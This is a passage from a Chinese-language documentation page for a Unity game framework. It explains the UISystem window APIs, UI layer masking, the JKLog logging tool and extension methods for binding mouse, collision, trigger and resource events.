<span class="hljs-comment">//(string windowKey, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(windowKey, layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(windowKey);


<span class="hljs-comment">//简单实例，打开窗口UI_WindowTest并置于第三层</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">UI_WindowTest</span>&gt;(<span class="hljs-number">2</span>);
</code></pre>
<ul>
<li>通过泛型T指定UI窗口子类类型，windowKey为UI窗口类的索引，对应UIWindowData中的windowKey，不指定则使用T的类型名作为索引，layer代表UI的层级，不填则默认-1表示使用数据中原有的层级（通过静态配置或者动态加载指定）。</li>
<li>在明确UI窗口类型的时候可以直接通过泛型T指定，不明确则可以通过传对象反射来获取类型。</li>
<li>简单解释逻辑为根据windowKey找到对应的窗口数据UIWindowData，根据数据中的assetPath加载UI窗口对象并根据T返回窗口类，无T则返回UI_WindowBase类。</li>
</ul>
<p>由于UI窗口类继承了UIWIndowBase，其中提供了一些可供重写的方法，这些方***在UI窗口打开时自动执行。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//初始化相关方法，只有在窗口第一次打开时执行</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Init();
    }


    <span class="hljs-comment">//窗口每次打开时执行，可用于数初始化，并会自动调用事件监听注册方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnShow</span>()</span>
    {
        <span class="hljs-keyword">base</span>.OnShow();
    }
    <span class="hljs-comment">//事件监听注册</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterEventListener</span>()</span>
    {
        <span class="hljs-keyword">base</span>.RegisterEventListener();
    }
</code></pre>
<h4 data-id="heading-80">UI窗口关闭</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(Type type) (string windowKey)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>(type);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryClose</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">CloseAllWindow</span>();


<span class="hljs-comment">//简单实例，关闭窗口UI_WindowTest</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>&lt;<span class="hljs-type">UI_WindowTest</span>&gt;();
</code></pre>
<ul>
<li>相比打开，关闭不需要返回值也不需要管理层级，通过T/Type/windowKey传入窗口的索引即可。</li>
<li>
<ul>
<li>TryClose API在遇到窗口已关闭或不存在时并不会warning，而其他API会报warning。</li>
</ul>
</li>
</ul>
<p>由于UI窗口类继承了UIWIndowBase，其中提供了一些可供重写的方法，这些方法在UI窗口关闭时自动执行。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//窗口每次关闭时执行，会动调用事件监听注销方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnClose</span>()</span>
    {
        <span class="hljs-keyword">base</span>.OnClose();
    }


    <span class="hljs-comment">//事件监听注销</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterEventListener</span>()</span>
    {
        <span class="hljs-keyword">base</span>.RegisterEventListener();
    }
</code></pre>
<h4 data-id="heading-81">获取/销毁UI窗口对象</h4>
<p>获取/销毁UIWindowData持有的UI窗口对象实例，与Onshow/OnClose不同，其只获取实例，不包含窗口游戏物体对象的显示/隐藏/销毁逻辑。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//返回值为UI窗口类T，T受泛型约束必须为UI窗口基类子类</span>
<span class="hljs-comment">//(string windowKey)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-type">Type</span> windowType);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-comment">//返回值为UI_WindowBase类，对应不能确定窗口类型的情况</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>(windowKey);
<span class="hljs-comment">//返回值为bool,表示窗口对是否存在</span>
<span class="hljs-comment">//(string windowKey, out T window)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetWindow</span>(windowKey, window);
<span class="hljs-comment">//(string windowKey, out T window)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey, window);
<span class="hljs-comment">//销毁窗口对象</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">DestroyWindow</span>(windowKey);


<span class="hljs-comment">//简单实例，获取TestWindow上的UI Text组件Name</span>
<span class="hljs-type">Text</span> name <span class="hljs-operator">=</span> <span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">TestWindow</span>&gt;().<span class="hljs-type">Name</span>;
</code></pre>
<ul>
<li>通过windowKey/type Name/T类型名查找窗口对象。</li>
<li>支持Try方式，查询成功则对象传递到输出参数out上，并返回bool为true，否则输出参数为null并返回false。</li>
<li>销毁窗口对象API会直接销毁游戏内的窗口gameObject、控制类，但UIWindowData还存在。</li>
</ul>
<h3 data-id="heading-82">UI层级管理</h3>
<p>框架内部实现了对UI的层级管理，可以在面板的UISystem上每一层是否启用遮罩，默认每一层UI是层层堆叠覆盖的，一旦某一层中有UI窗口对象，则层级比它低的层级都不可以交互，同一层级中比它早打开的UI窗口不可以交互（保证每一层内最顶层只有一个窗口），可以勾选不启用遮罩，则这一层层内和层外都不存在遮罩关系。</p>
<p>启用遮罩如下图。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5ca4656bb6c4fe2bf11e88d72afd149~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iBaEFmZck5f0KakQNDbmgsvgMN0%3D" alt="alt" loading="lazy"/>​</p>
<p>Mask保证了每一层内最顶层只有一个窗口进行交互。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1444d6d5f24b4c2dbbe44406b1f8471c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iBK2C2TNFa7N9BRKwkdET7%2Fhjas%3D" alt="alt" loading="lazy"/>​</p>
<p>另外框架单独提供了最顶层dragLayer，用于拖拽时临时需要把某个UI窗口置于最上层，可以通过UISystem.dragLayer获取。</p>
<pre><code class="hljs language-ini" lang="ini">UISystem.dragLayer<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-83">UI Tips</h3>
<p>弹窗工具。</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">//API</span>
<span class="hljs-comment">// 在窗口右下角弹出字符串tips提醒。</span>
<span class="hljs-comment">//(string tips)</span>
<span class="hljs-built_in">UISystem</span>.AddTips(tips)
</code></pre>
<h3 data-id="heading-84">判断鼠标是否在UI上</h3>
<p>返回当前鼠标位置是否在UI上，（用于替换EventSystem.current.IsPointerOverGameObject()，避免当前窗口因启用交互或同时需要考虑多层UI的层级关系，而启用覆盖全屏幕的遮罩Mask的RaycastTaret，使得鼠标处于UI窗口外时，Unity API一直错误的返回在UI上）。</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">//bool</span>
<span class="hljs-built_in">UISystem</span>.CheckMouseOnUI();
</code></pre>
<h2 data-id="heading-85">日志系统</h2>
<p>日志系统用于在控制台输出Log、Success、Error、Warning的提示信息（用白色、绿色、红色、黄色加以区分），并可以进行本地自定义命名保存，可以在面板上勾选是否启用日志输出、写入时间（毫秒级定位）、线程ID、堆栈(定位提示代码行)、本地保存。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df5536ba56846b3bd9b928113195bd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=9Ii1ldyYje2ocQSbRyMeViTlbzM%3D" alt="alt" loading="lazy"/>​</p>
<p>保留Unity提示自带的代码连接跳转功能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7dd67384f634ee086873dc065a67ec7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iOyemRJT53uLuVS%2Fc1EefNKvang%3D" alt="alt" loading="lazy"/>​</p>
<p>本地保存的日志可以用于在打包后进行调试输出。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51121d6f98714a46baf263988dbb2e92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=BYH8nU2G4mDxF1zY2xsVrV55Ths%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//输出日志测试信息，等同于Debug.Log</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Log</span>(<span class="hljs-string">"测试Log"</span>);
<span class="hljs-comment">//输出Warning类型的提示信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Warning</span>(<span class="hljs-string">"测试Warning"</span>);
<span class="hljs-comment">//输出Error类型的提示信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Error</span>(<span class="hljs-string">"测试Error"</span>);
<span class="hljs-comment">//输出Succeed类型的输出信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Succeed</span>(<span class="hljs-string">"测试Succeed"</span>);
</code></pre>
<ul>
<li>在方法参数部分传入要输出的字符串信息即可。</li>
</ul>
<h2 data-id="heading-86">事件工具</h2>
<p>用于给游戏对象快速绑定事件，而无需手动给游戏对象挂载脚本，功能逻辑在当前脚本实现。与事件系统区分：事件系统重点在于提供了一个事件监听添加和事件触发解耦的中间模块，使得事件的触发无需关注依赖的对象，但事件执行的功能逻辑还是要实现在对象挂载的脚本上的。而事件工具重点在于快速为游戏对象绑定常见的响应事件，这类事件不由脚本触发（后续支持自定义脚本触发条件），而是在特定的时机如碰撞、鼠标点击、对象销毁时自动触发，因此重点关注事件监听添加的简化，所有逻辑在当前脚本完成。</p>
<h3 data-id="heading-87">框架内置事件绑定与移除</h3>
<h4 data-id="heading-88">鼠标相关事件</h4>
<p>鼠标进入、鼠标移出、鼠标点击、鼠标按下、鼠标抬起、鼠标拖拽、鼠标拖拽开始、鼠标拖拽结束事件的绑定与移除。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//鼠标进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnMouseEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnMouseEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnMouseEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnMouseEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标移出</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnMouseExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnMouseExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnMouseExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnMouseExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标点击</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClick</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClick</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClick</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClick</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标按下</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClickDown</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClickDown</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClickDown</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClickDown</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标抬起</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClickUp</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClickUp</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClickUp</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClickUp</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽开始</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnBeginDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnBeginDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnBeginDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnBeginDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽结束</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnEndDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnEndDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnEndDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnEndDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//使用示例</span>
<span class="hljs-attribute">Transform</span> cube;
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnClick</span>&lt;int&gt;(Test1,<span class="hljs-number">1</span>);
}
private void <span class="hljs-built_in">Test1</span>(PointerEventData arg1, int arg2)
{
    Debug<span class="hljs-selector-class">.Log</span>(<span class="hljs-number">1</span>);
    cube<span class="hljs-selector-class">.RemoveOnClick</span>&lt;int&gt;(Test1);
}
</code></pre>
<ul>
<li>xx为绑定事件的对象组件，事件工具基于拓展方法调用，xx使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-89">碰撞相关事件</h4>
<p>2D、3D相关的碰撞事件绑定与移除。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//3D碰撞进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionStay</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionStay</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionStay</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionStay</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D碰撞脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionEnter2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionStay2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionExit2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单示例</span>
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnCollisionEnter</span>(Test2, <span class="hljs-number">2</span>);
}


private void <span class="hljs-built_in">Test2</span>(Collision arg1, int arg2)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg2);
    cube<span class="hljs-selector-class">.RemoveOnCollisionEnter</span>&lt;int&gt;(Test2);
}
</code></pre>
<ul>
<li>碰撞事件和鼠标事件的API类似，区别参与action的第一个事件本身参数不同，为Collision/Collision2D。</li>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-90">触发相关事件</h4>
<p>2D、3D相关的触发事件绑定。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//3D触发进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D触发持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerStay</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerStay</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerStay</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerStay</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D触发脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D触发进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerEnter2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerStay2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D触发脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerExit2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单示例</span>


void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnTriggerEnter</span>(Test3, <span class="hljs-number">2</span>);
}


private void <span class="hljs-built_in">Test3</span>(Collider arg1, int arg3)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg3);
    cube<span class="hljs-selector-class">.RemoveOnTriggerEnter</span>&lt;int&gt;(Test3);
}
</code></pre>
<ul>
<li>触发事件和碰撞事件的API类似，区别参与action的第一个事件本身参数不同，为Collider/Collider2D。</li>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-91">资源相关事件</h4>
<p>资源释放，对象销毁时绑定的事件。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//资源释放（Addressable）</span>
<span class="hljs-comment">//(this Component com, Action&lt;GameObject, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnReleaseAddressableAsset</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnReleaseAddressableAsset</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnReleaseAddressableAssetOnReleaseAddressableAsset</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnReleaseAddressableAsset</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//对象销毁</span>
<span class="hljs-comment">//(this Component com, Action&lt;GameObject, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
